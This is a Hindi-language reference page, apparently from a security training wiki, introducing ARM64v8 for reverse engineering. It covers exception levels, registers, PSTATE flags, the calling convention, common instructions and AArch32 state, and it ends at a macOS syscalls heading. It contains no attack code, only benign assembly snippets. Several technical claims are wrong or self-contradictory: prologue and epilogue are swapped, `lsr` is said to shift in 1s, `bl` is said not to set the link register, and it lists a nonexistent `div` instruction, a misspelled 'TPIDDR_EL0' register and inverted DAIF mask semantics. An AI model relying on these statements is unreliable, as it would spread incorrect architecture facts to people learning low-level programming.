# ARM64v8 का परिचय

{{#include ../../../banners/hacktricks-training.md}}


## **Exception Levels - EL (ARM64v8)**

ARMv8 architecture में execution levels, जिन्हें Exception Levels (ELs) कहा जाता है, execution environment के privilege level और capabilities को परिभाषित करते हैं। इसमें EL0 से EL3 तक चार exception levels होते हैं, और प्रत्येक का उद्देश्य अलग होता है:

1. **EL0 - User Mode**:
- यह सबसे कम privilege वाला level है और regular application code execute करने के लिए उपयोग किया जाता है।
- EL0 पर चलने वाले Applications एक-दूसरे से और system software से isolated रहते हैं, जिससे security और stability बढ़ती है।
2. **EL1 - Operating System Kernel Mode**:
- अधिकांश operating system kernels इसी level पर चलते हैं।
- EL1 के पास EL0 से अधिक privileges होते हैं और यह system resources को access कर सकता है, लेकिन system integrity बनाए रखने के लिए कुछ restrictions होती हैं। EL0 से EL1 पर जाने के लिए SVC instruction का उपयोग किया जाता है।
3. **EL2 - Hypervisor Mode**:
- इस level का उपयोग virtualization के लिए किया जाता है। EL2 पर चलने वाला hypervisor कई operating systems को manage कर सकता है, जिनमें से प्रत्येक अपने EL1 पर चलता है और एक ही physical hardware का उपयोग करता है।
- EL2 virtualized environments को isolate और control करने के लिए features प्रदान करता है।
- इसलिए Parallels जैसे virtual machine applications `hypervisor.framework` का उपयोग करके EL2 से interact कर सकते हैं और kernel extensions की आवश्यकता के बिना virtual machines चला सकते हैं।
- EL1 से EL2 पर जाने के लिए `HVC` instruction का उपयोग किया जाता है।
4. **EL3 - Secure Monitor Mode**:
- यह सबसे अधिक privileged level है और अक्सर secure booting तथा trusted execution environments के लिए उपयोग किया जाता है।
- EL3 secure और non-secure states के बीच access को manage और control कर सकता है, जैसे secure boot, trusted OS आदि।
- macOS में इसका उपयोग KPP (Kernel Patch Protection) के लिए किया जाता था, लेकिन अब नहीं किया जाता।
- Apple अब EL3 का उपयोग नहीं करता।
- EL3 पर transition आमतौर पर `SMC` (Secure Monitor Call) instruction का उपयोग करके किया जाता है।

इन levels का उपयोग system के अलग-अलग aspects को manage करने का structured और secure तरीका प्रदान करता है, user applications से लेकर सबसे अधिक privileged system software तक। ARMv8 का privilege levels के प्रति यह approach अलग-अलग system components को प्रभावी रूप से isolate करने में सहायता करता है, जिससे system की security और robustness बढ़ती है।

## **Registers (ARM64v8)**

ARM64 में **31 general-purpose registers** होते हैं, जिन्हें `x0` से `x30` तक label किया जाता है। प्रत्येक register **64-bit** (8-byte) value store कर सकता है। केवल 32-bit values की आवश्यकता वाले operations के लिए इन्हीं registers को 32-bit mode में w0 से w30 नामों के साथ access किया जा सकता है।

1. **`x0`** से **`x7`** - इनका उपयोग आमतौर पर scratch registers और subroutines को parameters pass करने के लिए किया जाता है।
- **`x0`** किसी function का return data भी carry करता है।
2. **`x8`** - Linux kernel में `x8` का उपयोग `svc` instruction के लिए system call number के रूप में किया जाता है। **macOS में इसका उपयोग x16 करता है!**
3. **`x9`** से **`x15`** - ये अतिरिक्त temporary registers हैं, जिनका उपयोग अक्सर local variables के लिए किया जाता है।
4. **`x16`** और **`x17`** - **Intra-procedural Call Registers**। Immediate values के लिए temporary registers। इनका उपयोग indirect function calls और PLT (Procedure Linkage Table) stubs के लिए भी किया जाता है।
- **macOS में `x16`** का उपयोग **`svc`** instruction के लिए **system call number** के रूप में किया जाता है।
5. **`x18`** - **Platform register**। इसका उपयोग general-purpose register के रूप में किया जा सकता है, लेकिन कुछ platforms पर यह register platform-specific uses के लिए reserved होता है: Windows में current thread environment block का pointer, या **Linux kernel में वर्तमान executing task structure** को point करने के लिए।
6. **`x19`** से **`x28`** - ये callee-saved registers हैं। किसी function को अपने caller के लिए इन registers की values preserve करनी होती हैं, इसलिए इन्हें stack में store किया जाता है और caller के पास लौटने से पहले recover किया जाता है।
7. **`x29`** - **Frame pointer**, जिसका उपयोग stack frame को track करने के लिए किया जाता है। जब किसी function के call होने पर नया stack frame बनाया जाता है, तो **`x29` register को stack में store** किया जाता है और **नए** frame pointer का address (`sp` address) इस register में **store** किया जाता है।
- इस register का उपयोग **general-purpose register** के रूप में भी किया जा सकता है, हालांकि आमतौर पर इसका उपयोग **local variables** के reference के रूप में किया जाता है।
8. **`x30`** या **`lr`**- **Link register**। जब `BL` (Branch with Link) या `BLR` (Branch with Link to Register) instruction execute होता है, तो यह **`pc`** value को इस register में store करके **return address** hold करता है।
- इसका उपयोग किसी अन्य register की तरह भी किया जा सकता है।
- यदि current function किसी नए function को call करने वाली है और इसलिए `lr` को overwrite करेगी, तो शुरुआत में इसे stack में store किया जाता है। यह epilogue है (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp` और `lr` को Store करें, space बनाएं और नया `fp` प्राप्त करें), और अंत में इसे recover किया जाता है। यह prologue है (`ldp x29, x30, [sp], #48; ret` -> `fp` और `lr` को Recover करें और return करें)।
9. **`sp`** - **Stack pointer**, जिसका उपयोग stack के top को track करने के लिए किया जाता है।
- **`sp`** value को हमेशा कम-से-कम **quadword alignment** पर रखा जाना चाहिए, अन्यथा alignment exception हो सकता है।
10. **`pc`** - **Program counter**, जो next instruction को point करता है। इस register को केवल exception generations, exception returns और branches के माध्यम से update किया जा सकता है। इसे read करने वाली एकमात्र ordinary instructions branch with link instructions (BL, BLR) हैं, जो **`pc`** address को **`lr`** (Link Register) में store करती हैं।
11. **`xzr`** - **Zero register**। इसके **32**-bit register form में इसे **`wzr`** भी कहा जाता है। इसका उपयोग आसानी से zero value प्राप्त करने के लिए किया जा सकता है (यह एक common operation है), या **`subs`** का उपयोग करके comparisons करने के लिए, जैसे **`subs XZR, Xn, #10`**, जिसमें resulting data कहीं store नहीं होता ( **`xzr`** में)।

**`Wn`** registers, **`Xn`** register का **32-bit** version हैं।

> [!TIP]
> X0 - X18 के registers volatile होते हैं, जिसका अर्थ है कि function calls और interrupts द्वारा उनकी values बदली जा सकती हैं। हालांकि X19 - X28 के registers non-volatile होते हैं, जिसका अर्थ है कि function calls के दौरान उनकी values preserve की जानी चाहिए ("callee saved")।

### SIMD और Floating-Point Registers

इसके अलावा, **128-bit length वाले 32 अन्य registers** होते हैं, जिनका उपयोग optimized single instruction multiple data (SIMD) operations और floating-point arithmetic करने के लिए किया जा सकता है। इन्हें Vn registers कहा जाता है, हालांकि ये **64**-bit, **32**-bit, **16**-bit और **8**-bit में भी operate कर सकते हैं; तब इन्हें क्रमशः **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** और **`Bn`** कहा जाता है।

### System Registers

**सैकड़ों system registers** होते हैं, जिन्हें special-purpose registers (SPRs) भी कहा जाता है। इनका उपयोग **processors** के behaviour को **monitoring** और **controlling** करने के लिए किया जाता है।\
इन्हें केवल dedicated special instructions **`mrs`** और **`msr`** का उपयोग करके read या set किया जा सकता है।

Special registers **`TPIDR_EL0`** और **`TPIDDR_EL0`** reverse engineering के दौरान आमतौर पर दिखाई देते हैं। `EL0` suffix उस **minimal exception level** को दर्शाता है, जिससे register को access किया जा सकता है (इस case में EL0 वह regular exception (privilege) level है, जिस पर regular programs चलते हैं)।\
इनका उपयोग अक्सर thread-local storage region के memory के **base address** को store करने के लिए किया जाता है। आमतौर पर पहला register EL0 पर चलने वाले programs के लिए readable और writable होता है, जबकि दूसरे को EL0 से read और EL1 (जैसे kernel) से write किया जा सकता है।

- `mrs x0, TPIDR_EL0 ; TPIDR_EL0 को x0 में Read करें`
- `msr TPIDR_EL0, X0 ; x0 को TPIDR_EL0 में Write करें`

### **PSTATE**

**PSTATE** में कई process components होते हैं, जिन्हें operating-system-visible **`SPSR_ELx`** special register में serialize किया जाता है, जहां X triggered exception के **permission level** को दर्शाता है (इससे exception समाप्त होने पर process state को recover किया जा सकता है)।\
ये accessible fields हैं:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- **`N`**, **`Z`**, **`C`** और **`V`** condition flags:
- **`N`** का अर्थ है कि operation ने negative result दिया।
- **`Z`** का अर्थ है कि operation ने zero result दिया।
- **`C`** का अर्थ है कि operation में carry हुआ।
- **`V`** का अर्थ है कि operation ने signed overflow दिया:
- दो positive numbers का sum negative result देता है।
- दो negative numbers का sum positive result देता है।
- Subtraction में, जब किसी छोटे positive number से बड़े negative number को subtract किया जाता है (या इसके विपरीत), और result दिए गए bit size की range में represent नहीं किया जा सकता।
- स्पष्ट रूप से processor यह नहीं जानता कि operation signed है या नहीं, इसलिए वह operations में C और V को check करेगा और carry होने पर indicate करेगा, चाहे operation signed हो या unsigned।

> [!WARNING]
> सभी instructions इन flags को update नहीं करतीं। कुछ, जैसे **`CMP`** या **`TST`**, ऐसा करती हैं; और जिनके अंत में s suffix होता है, जैसे **`ADDS`**, वे भी इन्हें update करती हैं।

- Current **register width (`nRW`) flag**: यदि flag की value 0 है, तो resume होने के बाद program AArch64 execution state में चलेगा।
- Current **Exception Level** (**`EL`**): EL0 में चलने वाले regular program की value 0 होगी।
- **Single stepping** flag (**`SS`**): Debuggers द्वारा single step करने के लिए उपयोग किया जाता है। Exception के माध्यम से **`SPSR_ELx`** के अंदर SS flag को 1 set किया जाता है। Program एक step चलेगा और single step exception issue करेगा।
- **Illegal exception** state flag (**`IL`**): इसका उपयोग तब mark करने के लिए किया जाता है, जब privileged software invalid exception level transfer perform करता है। यह flag 1 set हो जाता है और processor illegal state exception trigger करता है।
- **`DAIF`** flags: ये flags किसी privileged program को कुछ external exceptions को selectively mask करने की अनुमति देती हैं।
- यदि **`A`** 1 है, तो **asynchronous aborts** trigger होंगे। **`I`** external hardware **Interrupts Requests** (IRQs) के response को configure करता है, और F का संबंध **Fast Interrupt Requests** (FIRs) से है।
- **Stack pointer select** flags (**`SPS`**): EL1 और उससे ऊपर चलने वाले privileged programs अपने stack pointer register और user-model वाले register के बीच swap कर सकते हैं, जैसे `SP_EL1` और `EL0` के बीच। यह switching **`SPSel`** special register में write करके की जाती है। यह EL0 से नहीं किया जा सकता।

## **Calling Convention (ARM64v8)**

ARM64 calling convention के अनुसार किसी function के **पहले आठ parameters** registers **`x0`** से **`x7`** में pass किए जाते हैं। **Additional** parameters **stack** पर pass किए जाते हैं। **Return** value register **`x0`** में pass की जाती है, या यदि वह **128 bits long** हो तो **`x1`** में भी pass की जाती है। **`x19`** से **`x30`** और **`sp`** registers को function calls के दौरान **preserve** किया जाना चाहिए।

Assembly में किसी function को पढ़ते समय **function prologue और epilogue** देखें। **Prologue** में आमतौर पर **frame pointer (`x29`) को save करना**, **नया frame pointer set** करना और **stack space allocate करना** शामिल होता है। **Epilogue** में आमतौर पर saved frame pointer को **restore करना** और function से **return करना** शामिल होता है।

### Swift में Calling Convention

Swift की अपनी **calling convention** है, जिसे [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) में देखा जा सकता है।

## **Common Instructions (ARM64v8)**

ARM64 instructions का सामान्यतः **format `opcode dst, src1, src2`** होता है, जहां **`opcode`** perform किए जाने वाले **operation** को दर्शाता है, जैसे `add`, `sub`, `mov` आदि; **`dst`** वह **destination** register है जिसमें result store होगा; और **`src1`** तथा **`src2`** **source** registers हैं। Source registers के स्थान पर immediate values का भी उपयोग किया जा सकता है।

- **`mov`**: किसी value को एक **register** से दूसरे में **Move** करना।
- Example: `mov x0, x1` — यह `x1` की value को `x0` में move करता है।
- **`ldr`**: **memory** से value को **register** में **Load** करना।
- Example: `ldr x0, [x1]` — यह `x1` द्वारा point की गई memory location से value को `x0` में load करता है।
- **Offset mode**: origin pointer को प्रभावित करने वाला offset इस प्रकार दर्शाया जाता है:
- `ldr x2, [x1, #8]`, यह x1 + 8 से value को x2 में load करेगा।
- `ldr x2, [x0, x1, lsl #2]`, यह x0 array से x1 position (index) \* 4 पर मौजूद object को x2 में load करेगा।
- **Pre-indexed mode**: यह origin पर calculations apply करेगा, result प्राप्त करेगा और नए origin को origin में store भी करेगा।
- `ldr x2, [x1, #8]!`, यह `x1 + 8` को `x2` में load करेगा और `x1` में `x1 + 8` का result store करेगा।
- `str lr, [sp, #-4]!`, link register को sp में Store करता है और sp register को update करता है।
- **Post-index mode**: यह पिछले mode जैसा है, लेकिन पहले memory address access किया जाता है, फिर offset calculate करके store किया जाता है।
- `ldr x0, [x1], #8`, `x1` को `x0` में load करता है और x1 को `x1 + 8` से update करता है।
- **PC-relative addressing**: इस case में load किया जाने वाला address PC register के relative calculate किया जाता है।
- `ldr x1, =_start`, यह `_start` symbol के शुरू होने वाले address को current PC के relative x1 में load करेगा।
- **`str`**: किसी **register** से value को **memory** में **Store** करना।
- Example: `str x0, [x1]` — यह `x0` की value को `x1` द्वारा point की गई memory location में store करता है।
- **`ldp`**: **Load Pair of Registers**। यह instruction **consecutive memory** locations से दो registers **load** करती है। Memory address आमतौर पर किसी अन्य register की value में offset जोड़कर बनाया जाता है।
- Example: `ldp x0, x1, [x2]` — यह क्रमशः `x2` और `x2 + 8` वाली memory locations से `x0` और `x1` को load करता है।
- **`stp`**: **Store Pair of Registers**। यह instruction दो registers को **consecutive memory** locations में **store** करती है। Memory address आमतौर पर किसी अन्य register की value में offset जोड़कर बनाया जाता है।
- Example: `stp x0, x1, [sp]` — यह `x0` और `x1` को क्रमशः `sp` और `sp + 8` वाली memory locations में store करता है।
- `stp x0, x1, [sp, #16]!` — यह `x0` और `x1` को क्रमशः `sp+16` और `sp + 24` वाली memory locations में store करता है और `sp` को `sp+16` से update करता है।
- **`add`**: दो registers की values को **Add** करके result को किसी register में store करना।
- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (register या immediate)
- \[shift #N | RRX] -> shift perform करें या RRX call करें।
- Example: `add x0, x1, x2` — यह `x1` और `x2` की values को जोड़कर result को `x0` में store करता है।
- `add x5, x5, #1, lsl #12` — यह 4096 के बराबर है (एक 1 को 12 बार shift करना) -> 1 0000 0000 0000 0000
- **`adds`** यह `add` perform करता है और flags update करता है।
- **`sub`**: दो registers की values को **Subtract** करके result को किसी register में store करना।
- **`add`** का **syntax** देखें।
- Example: `sub x0, x1, x2` — यह `x1` से `x2` की value subtract करके result को `x0` में store करता है।
- **`subs`** यह `sub` जैसा है, लेकिन flag को update करता है।
- **`mul`**: **दो registers** की values को **Multiply** करके result को किसी register में store करना।
- Example: `mul x0, x1, x2` — यह `x1` और `x2` की values को multiply करके result को `x0` में store करता है।
- **`div`**: एक register की value को दूसरे से **Divide** करके result को किसी register में store करना।
- Example: `div x0, x1, x2` — यह `x1` की value को `x2` से divide करके result को `x0` में store करता है।
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: अंत से 0s जोड़ते हुए अन्य bits को आगे move करता है (n-times 2 से multiply करता है)।
- **Logical shift right**: शुरुआत में 1s जोड़ते हुए अन्य bits को पीछे move करता है (unsigned में n-times 2 से divide करता है)।
- **Arithmetic shift right**: **`lsr`** जैसा, लेकिन यदि most significant bit 1 हो तो 0s जोड़ने के बजाय **1s जोड़े जाते हैं** (signed में n-times 2 से divide करता है)।
- **Rotate right**: **`lsr`** जैसा, लेकिन right से हटाई गई value को left में append किया जाता है।
- **Rotate Right with Extend**: **`ror`** जैसा, लेकिन carry flag "most significant bit" के रूप में उपयोग होता है। इसलिए carry flag bit 31 पर move होता है और हटाई गई bit carry flag में चली जाती है।
- **`bfm`**: **Bit Field Move**, ये operations किसी value से **bits `0...n` को copy** करके उन्हें positions **`m..m+n`** पर place करते हैं। **`#s`** leftmost bit position और **`#r`** rotate right amount निर्दिष्ट करता है।
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** किसी register से bitfield को copy करके दूसरे register में copy करता है।
- **`BFI X1, X2, #3, #4`** X2 से 4 bits को X1 की 3rd bit से Insert करता है।
- **`BFXIL X1, X2, #3, #4`** X2 की 3rd bit से 4 bits Extract करके उन्हें X1 में copy करता है।
- **`SBFIZ X1, X2, #3, #4`** X2 से 4 bits को sign-extend करता है और उन्हें bit position 3 से शुरू करके X1 में insert करता है तथा right bits को zero करता है।
- **`SBFX X1, X2, #3, #4`** X2 से bit 3 से शुरू होने वाली 4 bits को extract करता है, उन्हें sign-extend करता है और result को X1 में रखता है।
- **`UBFIZ X1, X2, #3, #4`** X2 से 4 bits को zero-extend करता है और उन्हें bit position 3 से शुरू करके X1 में insert करता है तथा right bits को zero करता है।
- **`UBFX X1, X2, #3, #4`** X2 से bit 3 से शुरू होने वाली 4 bits को extract करता है और zero-extended result को X1 में रखता है।
- **Sign Extend To X:** किसी value के sign को extend करता है (या unsigned version में केवल 0s जोड़ता है), ताकि उसके साथ operations perform किए जा सकें:
- **`SXTB X1, W2`** W2 से byte के sign को **W2 से X1** तक extend करता है (`W2`, `X2` का आधा है), ताकि 64 bits भर सकें।
- **`SXTH X1, W2`** W2 से 16-bit number के sign को X1 तक extend करता है, ताकि 64 bits भर सकें।
- **`SXTW X1, W2`** W2 से byte के sign को X1 तक extend करता है, ताकि 64 bits भर सकें।
- **`UXTB X1, W2`** W2 से byte में 0s (unsigned) जोड़कर X1 तक extend करता है, ताकि 64 bits भर सकें।
- **`extr`:** निर्दिष्ट **concatenated pair of registers** से bits extract करता है।
- Example: `EXTR W3, W2, W1, #3` यह **W1+W2 को concat** करेगा और **W2 की bit 3 से W1 की bit 3 तक** प्राप्त करके उसे W3 में store करेगा।
- **`cmp`**: दो registers को **Compare** करता है और condition flags set करता है। यह **`subs`** का alias है, जो destination register को zero register पर set करता है। यह जानने के लिए उपयोगी है कि `m == n`।
- यह **`subs`** के समान syntax support करता है।
- Example: `cmp x0, x1` — यह `x0` और `x1` की values compare करता है और condition flags को उसी अनुसार set करता है।
- **`cmn`**: **Compare negative** operand। यह **`adds`** का alias है और समान syntax support करता है। यह जानने के लिए उपयोगी है कि `m == -n`।
- **`ccmp`**: Conditional comparison; यह comparison केवल तभी perform करता है जब पिछला comparison true हो और विशेष रूप से nzcv bits set करता है।
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> यदि x1 != x2 और x3 < x4 है, तो func पर jump करें।
- ऐसा इसलिए है क्योंकि **`ccmp`** तभी execute होगा जब पिछला **`cmp` `NE`** था। यदि ऐसा नहीं था, तो `nzcv` bits को 0 set किया जाएगा, जो **`blt`** comparison को satisfy नहीं करेगा।
- इसे **`ccmn`** के रूप में भी उपयोग किया जा सकता है (`cmp` बनाम `cmn` की तरह, लेकिन negative)।
- **`tst`**: यह check करता है कि comparison की values में से कोई दोनों 1 हैं या नहीं (यह result को कहीं store किए बिना ANDS की तरह काम करता है)। यह किसी register को किसी value से check करने और यह देखने के लिए उपयोगी है कि value में indicated register की कोई bit 1 है या नहीं।
- Example: `tst X1, #7` यह check करता है कि X1 की अंतिम 3 bits में से कोई 1 है या नहीं।
- **`teq`**: result को discard करते हुए XOR operation।
- **`b`**: Unconditional Branch
- Example: `b myFunction`
- ध्यान दें कि यह link register में return address fill नहीं करेगा (इसलिए उन subroutine calls के लिए उपयुक्त नहीं है जिन्हें वापस लौटना होता है)।
- **`bl`**: link के साथ **Branch**, जिसका उपयोग **subroutine** को **call** करने के लिए किया जाता है। यह **return address को `x30` में store** करता है।
- Example: `bl myFunction` — यह `myFunction` function को call करता है और return address को `x30` में store करता है।
- ध्यान दें कि यह link register में return address fill नहीं करेगा (इसलिए उन subroutine calls के लिए उपयुक्त नहीं है जिन्हें वापस लौटना होता है)।
- **`blr`**: Link to Register के साथ **Branch**, जिसका उपयोग उस **subroutine** को **call** करने के लिए किया जाता है जिसका target किसी **register** में निर्दिष्ट होता है। यह return address को `x30` में store करता है। (यह
- Example: `blr x1` — यह उस function को call करता है जिसका address `x1` में मौजूद है और return address को `x30` में store करता है।
- **`ret`**: **subroutine** से **Return**, आमतौर पर **`x30`** में मौजूद address का उपयोग करते हुए।
- Example: `ret` — यह `x30` में मौजूद return address का उपयोग करके current subroutine से return करता है।
- **`b.<cond>`**: Conditional branches
- **`b.eq`**: पिछली `cmp` instruction के आधार पर **यदि equal हो तो Branch**।
- Example: `b.eq label` — यदि पिछली `cmp` instruction ने दो equal values पाई हैं, तो यह `label` पर jump करता है।
- **`b.ne`**: **यदि Not Equal हो तो Branch**। यह instruction condition flags को check करती है, जो पिछली comparison instruction द्वारा set की गई थीं, और यदि compared values equal नहीं थीं, तो किसी label या address पर branch करती है।
- Example: `cmp x0, x1` instruction के बाद, `b.ne label` — यदि `x0` और `x1` की values equal नहीं थीं, तो यह `label` पर jump करता है।
- **`cbz`**: **Compare and Branch on Zero**। यह instruction किसी register की zero से तुलना करती है और यदि दोनों equal हों, तो किसी label या address पर branch करती है।
- Example: `cbz x0, label` — यदि `x0` की value zero है, तो यह `label` पर jump करता है।
- **`cbnz`**: **Compare and Branch on Non-Zero**। यह instruction किसी register की zero से तुलना करती है और यदि दोनों equal नहीं हों, तो किसी label या address पर branch करती है।
- Example: `cbnz x0, label` — यदि `x0` की value non-zero है, तो यह `label` पर jump करता है।
- **`tbnz`**: bit को test करके nonzero होने पर branch करता है।
- Example: `tbnz x0, #8, label`
- **`tbz`**: bit को test करके zero होने पर branch करता है।
- Example: `tbz x0, #8, label`
- **Conditional select operations**: ये ऐसे operations हैं जिनका behaviour conditional bits के आधार पर बदलता है।
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> यदि true है, तो X0 = X1; यदि false है, तो X0 = X2
- `csinc Xd, Xn, Xm, cond` -> यदि true है, तो Xd = Xn; यदि false है, तो Xd = Xm + 1
- `cinc Xd, Xn, cond` -> यदि true है, तो Xd = Xn + 1; यदि false है, तो Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> यदि true है, तो Xd = Xn; यदि false है, तो Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> यदि true है, तो Xd = NOT(Xn); यदि false है, तो Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> यदि true है, तो Xd = Xn; यदि false है, तो Xd = - Xm
- `cneg Xd, Xn, cond` -> यदि true है, तो Xd = - Xn; यदि false है, तो Xd = Xn
- `cset Xd, Xn, Xm, cond` -> यदि true है, तो Xd = 1; यदि false है, तो Xd = 0
- `csetm Xd, Xn, Xm, cond` -> यदि true है, तो Xd = \<all 1>; यदि false है, तो Xd = 0
- **`adrp`**: किसी **symbol का page address compute** करके उसे register में store करता है।
- Example: `adrp x0, symbol` — यह `symbol` का page address compute करके उसे `x0` में store करता है।
- **`ldrsw`**: memory से signed **32-bit** value **Load** करता है और उसे **64 bits तक sign-extend** करता है। इसका उपयोग common SWITCH cases के लिए किया जाता है।
- Example: `ldrsw x0, [x1]` — यह `x1` द्वारा point की गई memory location से signed 32-bit value load करता है, उसे 64 bits तक sign-extend करता है और `x0` में store करता है।
- **`stur`**: किसी अन्य register से offset का उपयोग करके **register value को memory location में Store** करता है।
- Example: `stur x0, [x1, #4]` — यह `x0` की value को उस memory address में store करता है जो वर्तमान में `x1` में मौजूद address से 4 bytes अधिक है।
- **`svc`** : **system call** करता है। इसका अर्थ "Supervisor Call" है। जब processor इस instruction को execute करता है, तो यह **user mode से kernel mode में switch** होता है और memory में उस specific location पर jump करता है जहां **kernel का system call handling** code मौजूद होता है।

- Example:

```armasm
mov x8, 93  ; exit के लिए system call number (93) को register x8 में Load करें।
mov x0, 0   ; exit status code (0) को register x0 में Load करें।
svc 0       ; system call करें।
```

### **Function Prologue**

1. **link register और frame pointer को stack में Save करें**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **नया frame pointer सेट अप करें**: `mov x29, sp` (वर्तमान function के लिए नया frame pointer सेट करता है)
3. **Local variables के लिए stack पर space allocate करें** (यदि आवश्यक हो): `sub sp, sp, <size>` (जहाँ `<size>` आवश्यक bytes की संख्या है)

### **Function Epilogue**

1. **Local variables को deallocate करें (यदि allocate किए गए हों)**: `add sp, sp, <size>`
2. **Link register और frame pointer को restore करें**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (link register में दिए गए address का उपयोग करके control को caller को लौटाता है)

## ARM Common Memory Protections

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 Execution State

Armv8-A 32-bit programs के execution को support करता है। **AArch32** दो **instruction sets** में से किसी एक को चला सकता है: **`A32`** और **`T32`**, और **`interworking`** के माध्यम से इनके बीच switch कर सकता है।\
**Privileged** 64-bit programs, lower privileged 32-bit में exception level transfer execute करके **32-bit** programs के **execution** को schedule कर सकते हैं।\
ध्यान दें कि 64-bit से 32-bit में transition exception level के lower होने के साथ होता है (उदाहरण के लिए, EL1 में मौजूद 64-bit program द्वारा EL0 में मौजूद program को trigger करना)। यह **`SPSR_ELx`** special register के **bit 4 को** **1** पर set करके किया जाता है, जब **`AArch32`** process thread execute होने के लिए ready हो, और `SPSR_ELx` का बाकी भाग **`AArch32`** program का CPSR store करता है। इसके बाद, privileged process **`ERET`** instruction को call करता है, जिससे processor **`AArch32`** में transition करता है और CPSR के आधार पर A32 या T32 में enter करता है**.**

**`interworking`** CPSR के J और T bits का उपयोग करके होता है। `J=0` और `T=0` का अर्थ **`A32`** है, जबकि `J=0` और `T=1` का अर्थ **T32** है। इसका मूल अर्थ यह है कि instruction set को T32 बताने के लिए **सबसे निचले bit को 1** पर set किया जाता है।\
यह **interworking branch instructions,** के दौरान set होता है, लेकिन जब PC को destination register के रूप में set किया जाता है, तब इसे अन्य instructions के साथ सीधे भी set किया जा सकता है। उदाहरण:

एक अन्य उदाहरण:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registers

16 32-bit registers (r0-r15) होते हैं। **r0 से r14 तक** इनका उपयोग **किसी भी operation** के लिए किया जा सकता है, हालांकि इनमें से कुछ आमतौर पर reserved होते हैं:

- **`r15`**: Program counter (हमेशा)। इसमें अगली instruction का address होता है। A32 में current + 8, और T32 में current + 4।
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (ध्यान दें कि stack हमेशा 16-byte aligned होता है)
- **`r14`**: Link Register

इसके अलावा, registers का backup **`banked registries`** में रखा जाता है। ये ऐसी जगहें हैं जो registers की values store करती हैं और exception handling तथा privileged operations में **fast context switching** की अनुमति देती हैं, ताकि हर बार registers को manually save और restore करने की आवश्यकता न हो।\
यह **`CPSR`** से processor state को उस processor mode के **`SPSR`** में save करके किया जाता है, जिसमें exception लिया जाता है। Exception return पर, **`CPSR`** को **`SPSR`** से restore किया जाता है।

### CPSR - Current Program Status Register

AArch32 में CPSR, **`PSTATE`** के समान कार्य करता है और execution को बाद में restore करने के लिए exception लिए जाने पर **`SPSR_ELx`** में भी store होता है:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Fields को कुछ groups में विभाजित किया गया है:

- Application Program Status Register (APSR): Arithmetic flags, जो EL0 से accessible हैं
- Execution State Registers: Process behaviour (OS द्वारा managed)।

#### Application Program Status Register (APSR)

- **`N`**, **`Z`**, **`C`**, **`V`** flags (AArch64 की तरह)
- **`Q`** flag: Specialized saturating arithmetic instruction के execution के दौरान **integer saturation occurs** होने पर यह 1 पर set हो जाता है। एक बार **`1`** पर set होने के बाद, यह तब तक यही value बनाए रखता है जब तक इसे manually 0 पर set न किया जाए। इसके अलावा, ऐसी कोई instruction नहीं है जो इसकी value को implicitly check करे; इसे manually read करके check करना पड़ता है।
- **`GE`** (Greater than or equal) Flags: इनका उपयोग SIMD (Single Instruction, Multiple Data) operations में होता है, जैसे "parallel add" और "parallel subtract"। ये operations एक ही instruction में multiple data points को process करने की अनुमति देते हैं।

उदाहरण के लिए, **`UADD8`** instruction parallel में (दो 32-bit operands से) **चार pairs of bytes को add** करती है और results को 32-bit register में store करती है। इसके बाद यह इन results के आधार पर **`APSR` में `GE` flags को set** करती है। प्रत्येक GE flag एक byte addition से संबंधित होता है और यह बताता है कि उस byte pair का addition **overflowed** हुआ या नहीं।

**`SEL`** instruction इन GE flags का उपयोग conditional actions करने के लिए करती है।

#### Execution State Registers

- **`J`** और **`T`** bits: **`J`** का मान 0 होना चाहिए और यदि **`T`** का मान 0 है, तो instruction set A32 का उपयोग किया जाता है; यदि इसका मान 1 है, तो T32 का उपयोग किया जाता है।
- **IT Block State Register** (`ITSTATE`): ये bits 10-15 और 25-26 होते हैं। ये **`IT`** prefixed group के अंदर मौजूद instructions की conditions store करते हैं।
- **`E`** bit: **endianness** को indicate करता है।
- **Mode and Exception Mask Bits** (0-4): ये current execution state निर्धारित करते हैं। इनमें से **5th** bit indicate करता है कि program 32bit (1) या 64bit (0) के रूप में चलता है। अन्य 4 bits वर्तमान में उपयोग हो रहे **exception mode** को represent करते हैं (जब कोई exception occur होता है और उसे handle किया जा रहा होता है)। Set की गई संख्या current priority को indicate करती है, यदि इसे handle किए जाने के दौरान कोई अन्य exception trigger होता है।

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: **`A`**, `I`, `F` bits का उपयोग करके कुछ exceptions को disable किया जा सकता है। यदि **`A`** का मान 1 है, तो इसका अर्थ है कि **asynchronous aborts** trigger होंगे। **`I`** external hardware **Interrupts Requests** (IRQs) के response को configure करता है, और F का संबंध **Fast Interrupt Requests** (FIRs) से है।

## macOS

### BSD syscalls

